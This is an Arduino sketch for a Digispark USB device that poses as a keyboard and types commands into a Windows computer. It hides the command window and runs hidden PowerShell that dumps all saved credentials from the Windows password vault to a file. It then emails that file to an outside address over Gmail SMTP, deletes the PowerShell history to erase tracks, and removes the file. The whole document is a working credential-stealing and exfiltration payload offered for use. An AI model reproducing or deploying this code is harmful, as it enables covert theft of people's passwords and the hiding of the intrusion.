#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 // Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); // Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(200);
  // grab passwords and save to temp.txt
  DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ } | Out-File -FilePath C:\temp.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);  
  DigiKeyboard.sendKeyStroke(KEY_M);
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  // email the temp.txt file to the specified email
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_EMAIL@gmail.com', 'YOUR_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUR_EMAIL@gmail.com'; $ReportEmail.To.Add('SEND_EMAIL_TO'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report.'; $ReportEmail.Attachments.Add('C:\temp.txt'); $SMTPInfo.Send($ReportEmail)\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_M);
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"del (Get-PSReadlineOption).HistorySavePath\"")); // erase tracks
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);  
  DigiKeyboard.sendKeyStroke(KEY_M);
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("del C:\temp.txt")); // delete temp.txt (where passwords reside)
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
  for(;;){ /*empty*/ }
}
